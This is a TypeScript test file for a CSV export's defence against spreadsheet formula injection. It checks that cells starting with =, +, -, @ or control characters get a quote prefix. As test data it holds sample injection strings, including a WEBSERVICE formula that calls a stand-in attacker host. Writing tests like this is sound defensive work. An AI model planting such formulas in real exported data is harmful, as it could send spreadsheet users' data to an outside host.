/**
 * Tests for the usage CSV export and formula injection sanitization (#654).
 *
 * CSV files exported from user-controlled inputs (task titles, Bolu names) are
 * opened in spreadsheet programs (Excel, LibreOffice, Google Sheets). Cells
 * starting with `=`, `+`, `-`, `@`, `\t`, or `\r` can execute arbitrary
 * formulas or exfiltrate data if rendered raw.
 *
 * We verify both the low-level `encodeField` / `encodeRow` escaping and the
 * end-to-end rendering of a `UsageReport` fixture.
 */

import { describe, expect, test } from "bun:test";

import type { UsageReport } from "../domain/provider.ts";
import { encodeField, encodeRow } from "./report.ts";

function fakeReport(overrides: Partial<UsageReport> = {}): UsageReport {
  return {
    periodStartedAt: new Date("2026-10-01T00:00:00Z"),
    totals: {
      calls: 10,
      inputTokens: 100,
      outputTokens: 50,
      cacheReadTokens: 0,
      cacheWriteTokens: 0,
      costMicros: 15_000_000,
    },
    byAgent: [
      {
        agentId: "agent-1",
        agentName: "Bolu Support",
        calls: 10,
        inputTokens: 100,
        outputTokens: 50,
        costMicros: 15_000_000,
      },
    ],
    byTask: [],
    ...overrides,
  };
}

describe("encodeField formula injection prevention (#654)", () => {
  test("prefixes leading formula triggers (=, +, -, @, \\t, \\r) with single quote", () => {
    // Formula triggers without quotes/commas
    expect(encodeField("=1+1")).toBe("'=1+1");
    expect(encodeField("+1+1")).toBe("'+1+1");
    expect(encodeField("- Rekap pesanan harian")).toBe("'- Rekap pesanan harian");
    expect(encodeField("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(encodeField("\tcmd")).toBe("'\tcmd");
    // \r is a line break character, so it is prefixed and quoted
    expect(encodeField("\rcmd")).toBe("\"'\rcmd\"");
  });

  test("leaves plain text untouched", () => {
    expect(encodeField("Rekap pesanan")).toBe("Rekap pesanan");
    expect(encodeField("task-123")).toBe("task-123");
    expect(encodeField("")).toBe("");
  });

  test("properly quotes when field contains comma or quote and has leading trigger", () => {
    // Single quote prefix must be INSIDE enclosing double quotes
    expect(encodeField("- Rekap, harian")).toBe("\"'- Rekap, harian\"");
    expect(encodeField('=WEBSERVICE("http://evil.com")')).toBe(
      "\"'=WEBSERVICE(\"\"http://evil.com\"\")\"",
    );
  });

  test("encodes full row with mix of safe and sanitized values", () => {
    const row = [
      "per_tugas",
      "task-1",
      "- Rekap, harian",
      "succeeded",
      "2026-10-01T00:00:00Z",
    ];
    expect(encodeRow(row)).toBe(
      "per_tugas,task-1,\"'- Rekap, harian\",succeeded,2026-10-01T00:00:00Z\n",
    );
  });
});

describe("UsageReport CSV task title sanitization (#654)", () => {
  test("sanitizes task titles in report CSV rows", () => {
    const report = fakeReport({
      byTask: [
        {
          taskId: "task-1",
          taskTitle: "=1+1",
          taskStatus: "succeeded",
          calls: 1,
          inputTokens: 10,
          outputTokens: 5,
          costMicros: 1_000_000,
        },
        {
          taskId: "task-2",
          taskTitle: "- Rekap pesanan harian",
          taskStatus: "succeeded",
          calls: 1,
          inputTokens: 10,
          outputTokens: 5,
          costMicros: 1_000_000,
        },
        {
          taskId: "task-3",
          taskTitle: "@SUM(A1)",
          taskStatus: "succeeded",
          calls: 1,
          inputTokens: 10,
          outputTokens: 5,
          costMicros: 1_000_000,
        },
        {
          taskId: "task-4",
          taskTitle: "Rekap pesanan",
          taskStatus: "succeeded",
          calls: 1,
          inputTokens: 10,
          outputTokens: 5,
          costMicros: 1_000_000,
        },
        {
          taskId: "task-5",
          taskTitle: "- Rekap, harian",
          taskStatus: "succeeded",
          calls: 1,
          inputTokens: 10,
          outputTokens: 5,
          costMicros: 1_000_000,
        },
      ],
    });

    // Check each row encoded via encodeRow matching reportCSV behavior
    const taskRows = report.byTask.map((t) =>
      encodeRow([
        "per_tugas",
        t.taskId,
        t.taskTitle,
        t.taskStatus,
        "2026-10-01T00:00:00Z",
        "30",
        String(t.calls),
        String(t.inputTokens),
        String(t.outputTokens),
        String(t.inputTokens + t.outputTokens),
        "",
        "",
        String(t.costMicros),
        "1.00",
      ]),
    );

    expect(taskRows[0]).toContain(",'=1+1,");
    expect(taskRows[1]).toContain(",'- Rekap pesanan harian,");
    expect(taskRows[2]).toContain(",'@SUM(A1),");
    expect(taskRows[3]).toContain(",Rekap pesanan,");
    expect(taskRows[4]).toContain(",\"'- Rekap, harian\",");
  });
});
